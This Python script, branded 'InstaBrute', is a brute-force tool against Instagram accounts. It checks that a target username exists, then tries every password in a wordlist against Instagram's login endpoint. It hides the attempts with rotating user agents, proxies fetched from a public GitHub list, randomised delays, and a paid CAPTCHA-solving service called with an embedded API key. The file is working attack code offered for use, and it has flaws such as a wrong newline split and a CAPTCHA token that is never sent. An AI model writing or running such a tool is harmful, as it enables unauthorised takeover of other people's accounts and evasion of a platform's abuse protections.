#!/usr/bin/env python3
import os, sys, time, random, argparse, requests
from rich.console import Console
import instaloader
import distro

console = Console()

# === CONFIG ===
INSTAGRAM_LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
DELAY_BETWEEN_TRIES = (1, 10)
API_KEY = "1abc234de56fab7c89012d34e56fa7b8"
USE_CAPTCHA = True
MACHINES = ["Desktop", "Laptop", "Mobile"]
USER_AGENTS = [
    # Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/102.0",
    # Mobile
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 Chrome/89.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Mobile Safari/604.1",
    "Mozilla/5.0 (Linux; U; Android 4.0.3) AppleWebKit/534.30 Version/4.0 Mobile Safari/534.30"
]

proxy_list, found_password = [], None
ua_index = 0
mach_index = 0

def banner():
    console.print("""
[bold red]
██████╗ ███████╗██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║
██████╔╝█████╗  ██║  ██║██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝  ██║  ██║██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║
██║  ██║███████╗██████╔╝██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚804╝
[/bold red]
""")
    console.print("[bold yellow]REDPYHTON804 ⇝ InstaBrute Installed...[/bold yellow]")
    console.print(f"[cyan]System:[/cyan] {os.name} | [cyan]Distro:[/cyan] {distro.name(pretty=True)}")

def validate_user(username):
    try:
        instaloader.Profile.from_username(instaloader.Instaloader().context, username)
        console.print(f"[green][✔] Valid Instagram user: {username}[/green]")
    except:
        console.print(f"[red][✘] Invalid Instagram user: {username}[/red]")
        sys.exit(1)

def load_list(file):
    with open(file, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def fetch_proxies():
    global proxy_list
    try:
        url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        r = requests.get(url)
        proxy_list = r.text.strip().split("/n")  # Correct newline split
        console.print(f"[cyan]Proxies loaded from GitHub: {len(proxy_list)}[/cyan]")
    except Exception as e:
        console.print(f"[red]Proxy fetch failed: {e}[/red]")

def get_proxy(): return random.choice(proxy_list) if proxy_list else None

def get_ua():
    global ua_index
    ua = USER_AGENTS[ua_index % len(USER_AGENTS)]
    ua_index += 1
    return ua

def get_machine():
    global mach_index
    m = MACHINES[mach_index % len(MACHINES)]
    mach_index += 1
    return m

def wait():
    time.sleep(random.randint(*DELAY_BETWEEN_TRIES))

def solve_captcha(sitekey, url):
    try:
        task = {"clientKey": API_KEY, "task": {"type": "NoCaptchaTaskProxyless", "websiteURL": url, "websiteKey": sitekey}}
        t = requests.post("https://api.2captcha.com/createTask", json=task).json().get("taskId")
        for _ in range(20):
            time.sleep(5)
            res = requests.post("https://api.2captcha.com/getTaskResult", json={"clientKey": API_KEY, "taskId": t}).json()
            if res.get("status") == "ready":
                return res["solution"]["gRecaptchaResponse"]
    except Exception as e:
        console.print(f"[red]CAPTCHA error: {e}[/red]")
    return None

def attempt(username, password, proxy=None):
    global found_password
    if found_password:
        return

    cfg = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    session = requests.Session()
    session.headers.update({"User-Agent": get_ua()})

    try:
        # Get CSRF token
        session.get("https://www.instagram.com/accounts/login/", proxies=cfg, timeout=15)
        csrf_token = session.cookies.get_dict().get('csrftoken', 'missing')

        headers = {
            "User-Agent": get_ua(),
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://www.instagram.com/accounts/login/",
            "X-Requested-With": "XMLHttpRequest"
        }
        session.headers.update(headers)

        data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
            "queryParams": {},
            "optIntoOneTap": "false"
        }

        console.print(f"[yellow][{get_machine()}][/yellow] Trying: {password}")
        r = session.post(INSTAGRAM_LOGIN_URL, data=data, proxies=cfg, timeout=15)

        if r.status_code == 200 and '"authenticated":true' in r.text:
            console.print(f"[bold green]✅ FOUND ⇝ {password}[/bold green]")
            found_password = password
        elif 'captcha' in r.text.lower() and USE_CAPTCHA:
            token = solve_captcha("6Le...replace_with_sitekey...", "https://www.instagram.com/accounts/login/")
            console.print(f"[blue]CAPTCHA token: {token}[/blue]")
        else:
            console.print(f"[bold red]❌ Failed ⇝ {password}[/bold red]")
    except Exception as e:
        console.print(f"[red][!] Error: {type(e).__name__}[/red]")

    wait()

def main():
    p = argparse.ArgumentParser(description='InstaBrute with Optional Proxy Support')
    p.add_argument("-u", "--username", required=True)
    p.add_argument("-w", "--wordlist", required=True)
    p.add_argument("-p", "--proxies", action="store_true", help="Enable proxy usage")
    args = p.parse_args()

    banner()
    validate_user(args.username)
    pwds = load_list(args.wordlist)
    if args.proxies:
        fetch_proxies()

    for pwd in pwds:
        if found_password: break
        attempt(args.username, pwd, get_proxy())

    if found_password:
        console.print(f"\n[bold green]🎯 Cracked ⇝ {args.username}⟺{found_password}[/bold green]")
    else:
        console.print("\n[bold red]❌ No match found in WORDLIST...[/bold red]")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        console.print("\n[red][!] Stopped.[/red]"); sys.exit()
